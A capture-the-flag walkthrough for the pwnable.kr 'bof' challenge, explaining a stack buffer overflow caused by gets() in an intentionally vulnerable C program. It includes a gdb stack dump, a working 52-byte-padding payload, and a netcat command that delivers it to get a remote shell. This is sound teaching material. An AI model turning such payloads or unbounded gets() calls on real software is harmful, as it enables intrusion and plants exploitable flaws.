---
title: "Buffer Overflow"
date: 2026-03-22T09:07:58-05:00
draft: false
toc: true
images:
tags:
  - c
  - buffer
  - shell
  - pwnable.kr
---

> **Source:** [#pwnable.kr](https://pwnable.kr/) — walkthrough notes from their **`bof`** challenge. You don’t need an account or to follow along to read this; it’s just context for where the problem came from.

Nana said buffer overflows are one of the most common software vulnerabilities. Is that true?

We are given this program and the goal is to get a shell and read the flag:

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

void func(int key){
    char overflowme[32];
    printf("overflow me : ");
    gets(overflowme);       // smash me!
    if(key == 0xcafebabe){
        setregid(getegid(), getegid());
        system("/bin/sh");
    } else {
        printf("Nah..\n");
    }
}

int main(int argc, char* argv[]){
    func(0xdeadbeef);
    return 0;
}
```

Right after the source on the site, the hint is basically:

> The **bof** binary is running at **`nc 0 9000`** under **bof_pwn** privilege. Get shell and read flag.

So the challenge is not only about local gdb. You have to **hit the real service** (netcat to their host on port **9000**). The `0` in the hint is how they phrase it on the server. When you connect from your machine, you use their hostname (e.g. **pwnable.kr**) and **9000**. That is how you reach the **bof** process running as **bof_pwn** and actually get the flag off the remote box.

## What we notice

1. main calls func with **0xdeadbeef**, so key starts as that. The win is **key == 0xcafebabe** when the if runs.
2. **gets(overflowme)** does not respect the 32-byte buffer. Extra input keeps writing into the stack past the buffer, so key can be overwritten.
3. Each character is one byte (the letter A is **0x41**). The offset to key is **52 bytes** of padding, then **4 bytes** that replace key (see below; that 52 is measured empirically for this binary).
4. Those last four bytes need to be **0xcafebabe** in little-endian form: **\xbe\xba\xfe\xca** (see [Endianness]({{< relref "Endianness.md" >}}) if that part is fuzzy).

At first I thought the hard part would be something else, but it really is just: walk far enough in memory with the input, then fix the four bytes at key.

## The real trick

The trick is **feeding enough bytes that the write reaches key**, then **putting the right four bytes there** instead of deadbeef.

## Stack dump (gdb / GEF)

First look at the stack. This is from a run where the only input so far was **AAAA** (four A’s), after stopping somewhere in func:

```text
gef➤  x/23x $esp
0xffffcb80:     0x5655701f      0x00000001      0xf7ffda20      0x5655620a
0xffffcb90:     0x00000000      0xffffce1b      0x00000002      0x41414141
0xffffcba0:     0xf7ffcf00      0x00000018      0x00000000      0xffffdfe4
0xffffcbb0:     0xf7fc7560      0xf7fc7000      0x00000000      0x66eaa900
0xffffcbc0:     0xf7fade34      0xffffccbc      0xffffcbe8      0x565562c5
0xffffcbd0:     0xdeadbeef      0xf7d9693c      0xf7fc1400
```

Each character is one byte. When you type AAAA, you are writing four bytes: 0x41, 0x41, 0x41, 0x41, in order. **gets** writes them one byte at a time into memory. In the dump above, the debugger shows those same four bytes as one 32-bit value **0x41414141**. That is only how the debugger displays four consecutive bytes at once. It does not mean the program received one “chunk” of 0x41414141; the input was still four separate bytes.

**deadbeef** at the bottom of the dump (`0xffffcbd0` here) is still **key** at **0xdeadbeef**. Four bytes of input was not enough to reach that slot yet.

## Offset to key

The offset to key is **52 bytes**, determined empirically as the distance from the start of overflowme to the key variable on the stack. That span includes the 32-byte buffer, saved EBP, the return address, and compiler-introduced padding.

Input is written contiguously into memory, so increasing input length moves the overwrite further up the stack.

After **52 bytes** of input, the next **4 bytes** overwrite key.

```text
52 bytes padding + 4 bytes = overwrite key
```

If the last four bytes are four more A’s, key becomes **0x41414141** and you get Nah. If they are **\xbe\xba\xfe\xca**, key becomes **0xcafebabe** and you’re in.

## Payload and remote (pwnable.kr)

Python’s print is awkward for raw bytes. Something like:

```bash
python3 -c "import sys; sys.stdout.buffer.write(b'A'*52 + b'\xbe\xba\xfe\xca')" > attack.txt
```

**On pwnable.kr (remote, not your local `./bof` only):** the hint is telling you to use **netcat** to port **9000** so your payload actually reaches their **bof** binary. After the exploit lands, **system("/bin/sh")** runs on the server. If you only pipe the file and stop, stdin can close right away and the shell exits before you can type **ls** or read the flag.

Use something like:

```bash
(cat attack.txt; cat) | nc pwnable.kr 9000
```

The first **cat** sends **attack.txt** (the raw payload). The second **cat** reads from your terminal and forwards it, so stdin stays open and the remote shell does not die immediately. Then you can run commands and grab the flag.

For a quick one-shot without an interactive follow-up, `(cat attack.txt) | nc pwnable.kr 9000` can still be enough if the service behaves differently, but the **two-cat** pattern is the usual trick when the shell would otherwise close.

Use whatever host or port the challenge gives you if it is not **pwnable.kr:9000**.

## Verification in gdb

This can be checked in gdb by inspecting memory or registers after supplying the payload. For example, with **attack.txt** built from the python line above:

```bash
gdb ./bof
run < attack.txt
info registers
```

After the run, check that the overwrite happened and that key reads as **0xcafebabe** (for example by breaking after **gets** and examining the word where key lives, or by confirming behavior when the compare runs).

## Summary

The vulnerability is basically: **gets** lets input spill past **overflowme** until **key** can be overwritten, and you set **key** to **0xcafebabe** with the last four bytes.

Related: [Endianness]({{< relref "Endianness.md" >}}), [File descriptor]({{< relref "file-descriptor.md" >}}).
